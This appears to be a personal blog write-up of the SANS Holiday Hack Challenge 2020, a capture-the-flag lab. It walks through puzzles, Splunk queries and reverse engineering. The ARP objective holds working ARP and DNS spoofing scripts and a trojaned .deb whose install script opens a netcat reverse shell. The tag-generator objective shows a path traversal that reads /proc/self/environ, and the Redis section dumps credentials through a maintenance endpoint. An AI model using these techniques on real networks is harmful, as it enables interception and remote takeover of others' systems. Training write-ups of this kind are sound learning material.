---
layout: post
title: "SANS Holiday Hack Challenge 2020"
date: 2021-01-10
---

I was introduced to Kringlecon 3 and the SANS Holiday Hack Challenge from my community over on Discord. When the convention first went live in December 2020 I wasnt in the position to dedicate enough time to it. Luckily for me, the deadline was extended until 11 January 2021, leaving me just over a week to tackle the challenges before going back to work. In this writeup I've captured my learnings and solutions, whilst trying to stay true to the storytelling narrative SANS did so well.

### Objectives

1. [01 - Uncover Santa's Gift List](#1) 
1. [02 - Investigate S3 Bucket](#2) 
1. [03 - Point-of-Sale Password Recovery](#3) 
1. [04 - Operate the Santavator](#4) 
1. [05 - Open HID Lock](#5) 
1. [06 - Splunk Challenge](#6) 
1. [07 - Solve the Sleigh’s CAN-D-BUS Problem](#7) 
1. [08 - Broken Tag Generator](#8) 
1. [09 - ARP Shenanigans](#9) 
1. [10 - Defeat Fingerprint Sensor](#10)
1. *11 - Naughty/Nice List with Blockchain Investigation (DNF)*

**Achievements**

1. [0A - Redis Redis Bug Hunt](#a)

---

## <a name="1"></a>01 - Uncover Santa's Gift List
There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.

### Solution

1. Head down to the bottom of the mountain
2. Zoom out (browser) so that you can see the billboard

![](/assets/shhc2020/01-01.png)

3. Clicking on the billboard will open [the image](https://2020.kringlecon.com/textures/billboard.png) in a new tab
4. Save the image

![](/assets/shhc2020/01-02.png)

5. Open the image locally or use [an online image editor](https://www.photopea.com/)
6. Crop the gift list and unswirl (`Filter > Distort > Twirl`) the image to find the solution

![](/assets/shhc2020/01-03.png)

`proxmark`

> The Proxmark is an RFID swiss-army tool, allowing for both high and low level interactions with the vast majority of RFID tags and systems world-wide. Originally built by Jonathan Westhues over 10 years ago, the device has progressively evolved into the industry standard tool for RFID Analysis.

---

## <a name="2"></a>02 - Investigate S3 Bucket
When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.

### Solution

![](/assets/shhc2020/02-01.png)

1. Using the `ls` command we see a directory called *bucket_finder*. This directory contains the following files

```
README  
bucket_finder.rb  
wordlist
```

2. Let's start off by reading the *README* file with `cat README`

```
This project goes alongside my blog post "Whats In Amazon's Buckets?"
http://www.digininja.org/blog/whats_in_amazons_buckets.php , read through that
for more information on what is going on behind the scenes.

...

This is a fairly simple tool to run, all it requires is a wordlist and it will
go off and check each word to see if that bucket name exists in the Amazon's
S3 system. Any that it finds it will check to see if the bucket is public,
private or a redirect.

Public buckets are checked for directory indexing being enabled, if it is then
all files listed will be checked using HEAD to see if they are public or private.
Redirects are followed and the final destination checked. All this is reported
on so you can later go through and analyse what has been found.
```

3. We saw in step 1 that we've already been given a wordlist, so let's try out the command with that wordlist: `./bucket_finder.rb wordlist`

```
http://s3.amazonaws.com/kringlecastle
Bucket found but access denied: kringlecastle
http://s3.amazonaws.com/wrapper
Bucket found but access denied: wrapper
http://s3.amazonaws.com/santa
Bucket santa redirects to: santa.s3.amazonaws.com
http://santa.s3.amazonaws.com/
        Bucket found but access denied: santa
```

4. Great, the tool found 3 private buckets but unfortunately Wrapper3000 is still on the loose. Perhaps we need to add *Wrapper3000* to our wordlist? Lets give that a shot using `nano wordlist`.

![](/assets/shhc2020/02-02.png)

5. Success, we've found the Bucket and the missing package.

```
Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 )
        <Public> http://s3.amazonaws.com/wrapper3000/package
```

6. Let's go ahead and download the package by visiting [http://s3.amazonaws.com/wrapper3000/package](assets/package)
7. Following the hint of this being an *over-wrapped* file we can safely assume that we are going to have to use various methods of uncompression to get to the final file. To get to the final file I followed this methodology:

```
1. Check the file type
2. Uncompress the file using the correct uncompression binary
3. Repeat
```

8. The first file is little tricky. By using `file package` we see that this file contains a long ASCII text. I'm guessing this is a hash so let's see if [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Unzip('',false/disabled)Bzip2_Decompress(false/disabled)&input=VUVzREJBb0FBQUFBQUlBd2hGRWJSVDhhbndFQUFKOEJBQUFjQUJ3QWNHRmphMkZuWlM1MGVIUXVXaTU0ZWk1NGVHUXVkR0Z5TG1KNk1sVlVDUUFEb0JmS1g2QVh5bDkxZUFzQUFRVDJBUUFBQkJRQUFBQkNXbWc1TVVGWkpsTloya3RpdndBQkh2K1EzaEFTZ0dTbi8vQXZCeER3Zi94ZTBnUUFBQWd3QVZta1lSVEtlMVBWTTlVMGVrTWcycG9BQUFHZ1BVUFVHcWVoaENNU2dhQm9BRDFOTkFBQUF5RW1KcFI1UUdnMGJTUFUvVkEwZW85SWFIcUJreHcyWVpLMk5VQVNPZWdESXp3TVhNSEJDRkFDZ0lFdlEySnJnOFY1MHREamg2MVB0M1E4Q21ncEZGdW5jMUlwdWkrU3FzWUIwNE0vZ1dLS2MwVnMyRFhremVKbWlrdElOcWpvM0pqS0FBNGRMZ0x0UE4xNW9BRExlODB0bmZMR1hoSVdhSk1pRWVTWDk5MnV4b2RSSjZFQXpJRnpxU2JXdG5OcUNURURNTDlBSzdISFN6eXlCWUt3Q0ZCVkpoMTdUNjM2YTZZZ3lqWDBlRTBJc0NiamNCa1JQZ2tLejZxMG9rYjFzV2ljTWFreTJNZ3NxdzJuVW01YXlQSFVlSWt0bkJJdmtpVVd4WUVpUnM1bkZPTThNVGs4U2l0VjdsY3hPS3N0MlFlZFN4Wjg1MWNlRFFleHNMc0ozQzg5Wi9nUTZYbjZLQktxRnNLeVRrYXFPKzFGZ21JbXRIS29Ka01jdGQyQjlKa2N3dk1yK2hXSUVjSVFqQVpHaFNLWU5QeEhKRnFKM3QzMlZqZ24vT0dkUUppSUh2NHU1SXB3b1NHMGxzVitVRXNCQWg0RENnQUFBQUFBZ0RDRVVSdEZQeHFmQVFBQW53RUFBQndBR0FBQUFBQUFBQUFBQUtTQkFBQUFBSEJoWTJ0aFoyVXVkSGgwTGxvdWVIb3VlSGhrTG5SaGNpNWllakpWVkFVQUE2QVh5bDkxZUFzQUFRVDJBUUFBQkJRQUFBQlFTd1VHQUFBQUFBRUFBUUJpQUFBQTlRRUFBQUFB) can help us identify it.

![](/assets/shhc2020/02-04.png)
![](/assets/shhc2020/02-05.png)
![](/assets/shhc2020/02-03.png)

9. Now that we've identified that this is a base64 hash of a zip file, let's go ahead and decode the hash and output it to a .zip file using `base64 --decode package > package.zip`

![](/assets/shhc2020/02-06.png)

10. Alright, down the rabbit hole we go...

```
┌─[parity0x1][~/Labs/kringlecon2020]                                       
└──╼ unzip package.zip                                                              
Archive:  package.zip                                                               
 extracting: package.txt.Z.xz.xxd.tar.bz2    

┌─[parity0x1][~/Labs/kringlecon2020]
└──╼ file package.txt.Z.xz.xxd.tar.bz2 
package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k                                       
                                                                                    
┌─[parity0x1][~/Labs/kringlecon2020]                                                
└──╼ bzip2 -d package.txt.Z.xz.xxd.tar.bz2                                          
                                                                                    
┌─[parity0x1][~/Labs/kringlecon2020]                                                
└──╼ file package.txt.Z.xz.xxd.tar                                                  
package.txt.Z.xz.xxd.tar: POSIX tar archive                                                          
                                                                                    
┌─[parity0x1][~/Labs/kringlecon2020]                                                
└──╼ tar -xvf package.txt.Z.xz.xxd.tar                                        
                                                                                    
┌─[parity0x1][~/Labs/kringlecon2020]                                                
└──╼ file package.txt.Z.xz.xxd                                                      
package.txt.Z.xz.xxd: ASCII text                                                    
                                                                           
┌─[✗][parity0x1][~/Labs/kringlecon2020]
└──╼ cat package.txt.Z.xz.xxd | xxd -r > package.txt.Z.xz

┌─[parity0x1][~/Labs/kringlecon2020]
└──╼ file package.txt.Z.xz
package.txt.Z.xz: XZ compressed data

┌─[parity0x1][~/Labs/kringlecon2020]
└──╼ xz --decompress package.txt.Z.xz

┌─[parity0x1][~/Labs/kringlecon2020]
└──╼ file package.txt.Z
package.txt.Z: compress'd data 16 bits

┌─[parity0x1][~/Labs/kringlecon2020]
└──╼ uncompress package.txt.Z 

┌─[parity0x1][~/Labs/kringlecon2020]
└──╼ file package.txt
package.txt: ASCII text
```

11. Finally, we can grab the solution with `cat package.txt` which is `North Pole: The Frostiest Place on Earth`

---

## <a name="3"></a>03 - Point-of-Sale Password Recovery
Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?

### Solution

![](/assets/shhc2020/03-01.png)

1. While waiting for [santa-shop.exe](assets/santa-shop.exe) to download, I had a bit of a chat with Sugarplum Mary. Sugarplum slipped that this is an *Electron* application and that I should see if I can extract an ASAR file from the binary.
2. To extract exe files on Linux we can use 7zr (from package p7zip-full or p7zip). So lets go ahead and do that with `7zr e santa-shop.exe`

![](/assets/shhc2020/03-02.png)

3. Aha, there it is (*app.asar*). I did some Google research and stumbled across [this article](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37) that outlines how we can get the source code.

```
# Open terminal and install asar node module globally
$ npm install -g asar

# Go into the app’s directory
$ cd ~/path/to/asar/dir

# Create a directory to paste the content of app
$ mkdir example-sourcecode

# Unpack the app.asar file in the above directory using asar
$ asar extract app.asar example-sourcecode 
```

![](/assets/shhc2020/03-03.png)

4. Knowing that Javascript is a dynamic language, it's likely that the password would be stored in a js file. Lets take a peek at *main.js* using `cat main.js | head`. Bingo, we've found the password: `santapass`.

![](/assets/shhc2020/03-04.png)

---

## <a name="4"></a>04 - Operate the Santavator
Talk to Pepper Minstix in the entryway to get some hints about the Santavator.

### Hints

1. You'll need a key (Sparkle Redberry) and other odd objects. Use them to split, redirect and colour the santavator. Power red, yellow and green recievers.

### Solution

You'll need a key (Sparkle Redberry) and other odd objects. Use them to split, redirect and colour the santavator. Power red, yellow and green recievers. 

1. This one was pretty straight forward (or so I thought). I started off by speaking to Sparkle so I could get the panel key.
2. I then wandered around the Lobby (Castle Ground) collecting all of the odd objects that I could find.
3. I entered the santavator, opened the panel using the key and diverted the stream of light through the green bulb to the green receiver. I could now move to another (green) floor.

![](/assets/shhc2020/04-01.png)

4. I continued exploring all of the floors, collecting the remaining odd objects so that I could move between all of the floors. But Even after collecting all of the objects I was still missing the button that would take me to the workshop. Maybe it's time to turn to code? So I popped open the inspect element and surprise... there it was, a far quicker approach (hack).
5. I changed the `data-floor` attribute of `btn1` to `1.5`. I could now click on `btn1` and be taken to the Workshop instead of the Lobby.

![](/assets/shhc2020/04-02.png)

---

## <a name="5"></a>05 - Open HID Lock
Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.

### Solution

1. What's up Bushy Evergreen, what have you got for us? Ah, another reverse engineering callenge, this time a Rust application. The hint suggests we don't need low-level reverse engineering so lets start off with a simple `strings ./door | grep pass` to see if we can find anything. Bingo, we have the password.

![](/assets/shhc2020/05-01.png)

2. We also found a proxmark3 lying around which we grabbed. I'm sure we're going to need this to open the HID lock in the workshop.
3. Let's stroll on down to Fitzy and see what he has to say. He needs help turning on the Christmas tree lights... but the dial-up modem is broken. The phone number is 756-8347, can we help with the [handshake sequence](https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg)?
4. Using the telephone, my guess is that we need to mimic the handshale sequenze. Time to speak dial-up.

![](/assets/shhc2020/05-02.png)

5. Pick-up the phone, enter 7568347, baa DEE brrr, aaaah, wewewwwrrwrr, beDURRdunditty, SCHHRRHHRTHRTHRTR. Success!
6. Having completed the challenge, we're told that Santa really trusts Shinny Upatree. Perhaps he has an RFID card that we can clone. I found him standing outside, casually walked past with my Proxmark3 open and issued the `auto` command. Gotcha!

![](/assets/shhc2020/05-03.png)

7. In the workshop we encounter a locked door, perhaps I need to help Minty Candycane fix the Sort-O-Matic before I can get in. Bring out the regular expressions.
8. Dammit, the door is still locked. Wait a minute... I know I can clone a card with Proxmark, I wonder if I can simulate one too. After some Google research I stumpled across this [cheatsheet](https://cheatography.com/countparadox/cheat-sheets/proxmark3/) and there it was, `lf hid sim -r <tag ID>`

![](/assets/shhc2020/05-05.png)

9. I fired off the command and the door popped open. I headed down the passage towards the light only to become... SANTA!

---

## <a name="6"></a>06 - Splunk Challenge
Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?

![](/assets/shhc2020/06-01.png)

Splunk, I've never heard of it. This is going to be interesting. Luckily for us there are a fair amount of training questions so let's dive in...

### Resources

> Splunk Enterprise Security (Splunk ES) is a security information and event management (SIEM) solution that enables security teams to quickly detect and respond to internal and external attacks, to simplify threat management while minimizing risk, and safeguard your business.

> https://attack.mitre.org/techniques/enterprise/
> https://github.com/redcanaryco/atomic-red-team
> https://www.youtube.com/watch?v=RxVgEFt08kU
> https://www.splunk.com/
> https://www.splunk.com/pdfs/solution-guides/splunk-quick-reference-guide.pdf

### Hints

```
 | tstats count where index=* by index 
```

### Solution

1. How many distinct MITRE ATT&CK techniques did Alice emulate? `13`

```
| tstats count where index=* by index 
| search index=T*-win OR T*-main
| rex field=index "(?<technique>t\d+)[\.\-].0*" 
| stats dc(technique)
```

2. What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space). `t1059.003-main t1059.003-win`
3. One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the [registry key that is queried to determine the MachineGuid](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery)? `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography`
4. According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) `2020-11-30T17:44:15Z`

```
index = attack 
|  search "OSTAP"
```

5. One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? `3648`

```
Search Github for frgnca and note repos:
https://github.com/frgnca/AudioDeviceCmdlets

Search repos within ART repo:
https://github.com/redcanaryco/atomic-red-team/search?q=AudioDeviceCmdlets

--> https://github.com/redcanaryco/atomic-red-team/blob/8eb52117b748d378325f7719554a896e37bccec7/atomics/T1123/T1123.md

index=* sourcetype="xmlwineventlog" EventCode=1 
|  search "WindowsAudioDevice"
```

![](/assets/shhc2020/06-02.png)

6. Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? `quser`

```
T1547.001 - Registry Run Keys / Startup Folder 

Let's have a look at ATR:
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

Looks like it will utilise the powershell option:
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-3---powershell-registry-runonce

We can see this is fetching Discovery.bat
https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat

```

7. According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? `55FCEEBB21270D9249E86F4B9DC7AA60`

```
index=* sourcetype=bro* 
index=* sourcetype="bro:x509:json"
```

8. What is the name of the adversary group that Santa feared would attack KringleCon? `The Lollipop Guild`

```
The base64 encoded ciphertext is:
7FXjP1lyfKbyDK/MChyf36h7

It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one! 

Prohibiting RC4 Cipher Suites
RFC 7465 requires that Transport Layer Security (TLS) clients and servers never negotiate the use of RC4 cipher suites when they establish connections.

Salt: Stay Frosty
```

![](/assets/shhc2020/06-03.png)

---

## <a name="7"></a>07 - Solve the Sleigh's CAN-D-BUS Problem
Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.

### Solution

1. I teleported to the roof for a chit-chat with Wunorse. Turns out "Santa" made some tweaks to the sled that just aren't right. I fired up the CAN-Bus investigation terminal and pepared myself to learning another new thing... `CAN bus`

> A Controller Area Network (CAN bus) is a robust vehicle bus standard designed to allow microcontrollers and devices to communicate with each other's applications without a host computer. It is a message-based protocol, designed originally for multiplex electrical wiring within automobiles to save on copper, but can also be used in many other contexts. For each device the data in a frame is transmitted sequentially but in such a way that if more than one device transmits at the same time the highest priority device is able to continue while the others back off. Frames are received by all devices, including by the transmitting device.

![](/assets/shhc2020/07-01.png)

2. Ok, so a CAN Bus is a communicaion standard that allows things like steering wheels, door locks and radios to communicate with one another. I'm going to need a little bit more though so let's watch the [Chris Elgee, CAN Bus Can-Can KringleCon 2020](https://www.youtube.com/watch?v=96u-uHRBI0I) video quickly.

```
Each message gets its own CAN ID
DATA chunk changes depending on manufacturer

Example: 0x17A - 00 00 00 = Lock
Example: 0x17A - 00 00 01 = Unlock 
```

3. I inspected the logs using `cat candump.log` and spotted 3 unique CAN IDs (244, 188, 19B). The clue "also in the data are a LOCK signal, UNLOCK signal, and more lock signal" let's me know I'm looking for a CAN ID that only repeats 3 times. Only `cat candump.log | grep 19B#` returned 3 results, that must be it. I also noticed that the first and third DATA chunks matched meaning the second must be different ie. UNLOCK. I was correct!

![](/assets/shhc2020/07-02.png)

4. [I know Kung Fu!](https://www.youtube.com/watch?v=0YhJxJZOWBw) So let's tackle the main challenge now. We're presented with a control panel, a comparison operator and a live candump log. The only thing I can think of is to work methodically through each control and map the CAN ID and data chunks to the controls, hoping tospot something out of the ordinary.

```
19B#000000000000 = Lock
19B#00000F000000 = Unlock
02A#00FF00 = Start
02A#0000FF = Stop

080#000000000000 = Braking
- 080#FFFFFF (sus) -> Doesn't impact braking (non-numeric)

019#xxxxxxxxxxxx = Steering
244#0000000xxx = Accelerate / RPM

- 188#000000000000 (sus)
- 19B#0000000F2057 (sus) (repeats)
```

5. This challenge took me a while, trying various combinations until I finally got lucky and cracked it. There was no hack (not for me anyway), just good-ol' process of elimination.

![](/assets/shhc2020/07-03.png)

---

## <a name="8"></a>08 - Broken Tag Generator
Help Noel Boetie fix the [Tag Generator](https://tag-generator.kringlecastle.com/) in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.

### Hints

1. We might be able to find the problem if we can get source code!
- Can you figure out the path to the script? It's probably on error pages!
- Once you know the path to the file, we need a way to download it!
- Is there an endpoint that will print arbitrary files?
- If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!
- I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?
- If you find a way to execute code blindly, I bet you can redirect to a file then download that file!
- Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!
- Blind command injection can be frustrating. Do you think output redirection would help.

### Solution

1. After completing the Redis Bug Hunt Challenge, Holly opened up with some hints for this objective. Some of these techniques were new to me, so I started off with a little research.

> [Content Type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) - In responses, a Content-Type header tells the client what the content type of the returned content actually is. Browsers will do MIME sniffing in some cases and will not necessarily follow the value of this header; to prevent this behavior, the header `X-Content-Type-Options` can be set to `nosniff`.

***Possible exploits: https://medium.com/@ethicalevil/nosniff-and-the-rabbit-hole-of-mime-sniffing-in-browsers-9f764a454a46***

> [Blind Code Execution](https://medium.com/@viveik.chauhan/blind-remote-code-execution-b9c4e119f7c3) - This vulnerability occurs when attackers can execute malicious code or commands on a target machine and the output of the command/code executed will not be displayed in the response.

***Possible exploit: https://medium.com/@viveik.chauhan/blind-remote-code-execution-b9c4e119f7c3***

> [Output Redirection](http://www.linfo.org/output_redirection_operator.html) - The output redirection operator is a rightward pointing angular bracket (>) that is used in shells to redirect standard output to a file, where it is written and saved.

2. Following the hints, I started off trying to throw an error. I opened up ***Inspect Element*** in Firefox and went to the ***Network*** tab and loaded up https://tag-generator.kringlecastle.com/. I noticed that after uploading a file it was directly accessible from `/image?id=<guid>`.

![](/assets/shhc2020/08-02.png)

3. I started manipulating the URL trying to find a **server** error. After 3 tries I was able to get one which handed me the `/app/lib/app.rb` script on a silver platter.

```
https://tag-generator.kringlecastle.com/image?id= [NOPE]
https://tag-generator.kringlecastle.com/image?id=' [NOPE]
https://tag-generator.kringlecastle.com/image [BINGO!]
```
![](/assets/shhc2020/08-03.png)

4. Now that I knew the path, I just had to figure out a way to download it by manipulating an endpoint that printed arbitrary files. The search continued...after trying in the browser for about an hour I remembered the hint that browsers can behave badly and so maybe I would have more luck using `curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb --output source.rb`. This worked and I now had a local copy of the [source code](/assets/source.rb) for auditing purposes.
5. I don't really know Ruby so before going down that route I wanted to see if there wasn't a way I could grab the environment variable with the LFI (local file inclusion). I found this [article](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) while researching "Ruby local file inclusion exploit" which mentioned something about a `/proc/self/environ` file. Some more research reveals that [in Linux based system the environment-variables of the current process (self) can be accessed via /proc/self/environ. ](http://www.sec-art.net/2019/01/exploiting-local-file-inclusion-lfi.html). Surely it couldn't be this easy as there we still some unused hints? Spoiler alert, it was!

![](/assets/shhc2020/08-04.png)

---

## <a name="9"></a>09 - ARP Shenanigans

Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at `/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`. Who recused herself from the vote described on the document?

### Hints

1. Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using `tcpdump -nni eth0` to see if you can view any traffic from that host.
2. The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in `/home/guest/scripts`.
3. Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.
4. The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a [customized .deb file](http://www.wannescolman.be/?p=98).

### Solution

1. Chatting to Alabaster, we get some really handy hints. The attack vector seems clear... perform a MITM attack so we can serve a trojaned .deb file and gain remote access inorder to read the board meeting minutes.
2. I started off by reading the *HELP.md* file with `cat HELP.md` which gave me some handy commands to utilise.

```
# To Launch a webserver to serve-up files/folder in a local directory:

> python3 -m http.server 80

# A Sample ARP pcap can be viewed at:
https://www.cloudshark.org/captures/d97c5b81b057

# A Sample DNS pcap can be viewed at:
https://www.cloudshark.org/captures/0320b9b57d35

# If Reading arp.pcap with tcpdump or tshark be sure to disable name resolution or it will stall when reading:

> tshark -nnr arp.pcap
> tcpdump -nnr arp.pcap
```
3. Ok, let's sniff eth0 and see what is going on here. For this we use the command `tcpdump -nni eth0`. This shows an ARP request from `10.6.6.35` asking `who-has` `10.6.6.53`.

![](/assets/shhc2020/09-02.png)

4. Following the ARP pcap example, I went ahead and updated the example ***arp_resp.py*** script so we could become a man-in-the-middle. I referred to the [main documentation](https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html) for reference.

```
#!/usr/bin/python3 
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

# Our eth0 mac address               
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    if ARP in packet and packet[ARP].op == 1:                                    
        
        # Get the src MAC address from the ARP who-has request and set it as dst, also Set this machines MAC address as the src.
        ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)      

        # Send the ARP packet back to the originator (source)
        arp_response = ARP(pdst=packet[ARP].psrc)

        # Follow the ARP example 
        arp_response.op = 2               
        arp_response.plen = 4
        arp_response.hwlen = 6
        arp_response.ptype = 2048
        arp_response.hwtype = 1

        # Flip the ARP request around (source becomes destination)
        arp_response.hwsrc = macaddr
        arp_response.psrc = packet[ARP].pdst
        arp_response.hwdst = packet[ARP].hwsrc
        arp_response.pdst = packet[ARP].psrc

        response = ether_resp/arp_response

        sendp(response, iface="eth0")

def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()

```

5. After running the script with `./arp_resp.py` I could now see a second packet heading "over the wire". This must be the DNS request that I need to spoof. I fired up `vim dns_resp.py` and started tweaking the script to match the DNS pcap example. I also followed this tutorial from [Dartmouth](https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html).

```
#!/usr/bin/python3                   
from scapy.all import *
import netifaces as ni
import uuid                                                                        

# Our eth0 IP                                                                      
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

# Destination ip we arp spoofed
# I forgot to change this originally which had me scratching my head for a while
ipaddr_we_arp_spoofed = "10.6.6.53"

def handle_dns_request(packet):
	print("[+] Spoofing DNS now...")
	# Need to change mac addresses, Ip Addresses, and ports below.
	
	# Again, here all we do is switch src/dest around
	eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)	# need to replace mac addresses
	ip  = IP(dst=packet[IP].src, src=packet[IP].dst)		# need to replace IP addresses
	udp = UDP(dport=packet[IP].sport, sport=53)			# need to replace ports
	dns = DNS(                                                         
		# MISSING DNS RESPONSE LAYER VALUES
		# https://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
		id=packet[DNS].id, 
		qd=packet[DNS].qd, 
		aa = 1, 
		qr=1, 
		an=DNSRR(rrname=packet[DNS].qd.qname, 
		ttl=10, 
		rdata=ipaddr)
	)                                                                              
	dns_response = eth / ip / udp / dns
	sendp(dns_response, iface="eth0")                                              
										 
def main():
	print("[+] DNS Spoofing")
	berkeley_packet_filter = " and ".join( [
		"udp dst port 53",                              # dns                      
		"udp[10] & 0x80 = 0",                           # dns request              
		"dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
		"ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
	] )
														 
	# sniff the eth0 int without storing packets in memory and stopping after one dns request
	sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
																	  
if __name__ == "__main__":               
	main()
```

6. Here goes nothing, lets start up a simple http server using `python3 -m http.server 80` and see if we have been able to spoof the DNS request and have it hit our server instead.

![](/assets/shhc2020/09-03.png)

7. That my friends, is what success looks like. Let's serve up a reverse shell at `/pub/jfrost/backdoor/suriv_amd64.deb` so we can gain access to the machine. I followed [this guide](https://h2-exploitation.blogspot.com/2013/07/debian-package-binary-linux-trojan.html) to create the malicious Debian Package.

```
mkdir pub/jfrost/backdoor/
cd pub/jfrost/backdoor/

cp ~/debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb .
dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work

mkdir work/DEBIAN
apt-cache show netcat | sed '/^Original-Maintainer/d' | sed '/^SHA/d' > work/DEBIAN/control
cat work/DEBIAN/control

ifconfig eth0
echo "nc -e /bin/bash 10.6.0.3 4444" > work/DEBIAN/postinst
chmod 0755 work/DEBIAN/postinst
dpkg-deb --build work

mv work.deb suriv_amd64.deb

```

8. With our trojan ready, we can start a netcat listener using `nc -lvnp 4444` and serve up the malicious file... and there you have a reverse shell.

![](/assets/shhc2020/09-04.png)

9. We can now run `cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt` and see that Tanta Kringle recused herself from the vote. 

---

## <a name="10"></a>10 - Defeat Fingerprint Sensor

Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.

### Solution

1. I wonder whether my hack from [Objective 4 - Operate the Santavator](#4) would work again? So I hopped into the santavator and popped open inspect element, set the value of `data-floor` for `.btn2` to `3` and pressed the button...

![](/assets/shhc2020/10-01.png)

2. Wait a minute, I'm in Santa's office but the objective hasn't been completed. I was perplexed. I didn't use the fingerprint sensor and there I was standing in **my** office.
3. Having thought I'd found an unintended solution I went back in to the santavator and spent another hour trying an alternative workaround that might be accepted. Then it hit me, I was standing in **my** office. I was Santa and maybe I needed to get into the office as my original player.
4. I remembered stepping out of the large picture in the Entry as Santa so perhaps stepping back in as Santa would return me to my original player. I was right and now I could head back to the santavator to give my inital attempt another shot.
5. I was greatful that this time around it worked. I was in Santa's office without using the fingerprint sensor and the objective was awarded to me.

![](/assets/shhc2020/10-02.png)

---

## <a name="a"></a>0A - Redis Bug Hunt

Ok, this was not one of the main objectives but it kept me stumped for hours. I learnt so much that it would be a travesty not to do a write-up.

```
We need your help!!

The server stopped working, all that's left is the maintenance port.

To access it, run:

curl http://localhost/maintenance.php

We're pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page?
```

1. I started off by executing `curl http://localhost/maintenance.php`

```
ERROR: 'cmd' argument required (use commas to separate commands); eg:
curl http://localhost/maintenance.php?cmd=help
```

2. Issuing `curl http://localhost/maintenance.php?cmd=help` let's us know that we can pass a comma separated list of `redis-cli` commands to the cmd param for execution.

![](/assets/shhc2020/0a-01.png)

3. I clicked that this was `localhost` and I could therefore run `redis-cli` locally (without curl). I just needed the AUTH password which was being censored. After some in-depth research I discovered `curl http://localhost/maintenance.php?cmd=config,get,*`. This returned all config information and there it was in plaintext:

![](/assets/shhc2020/0a-02.png)

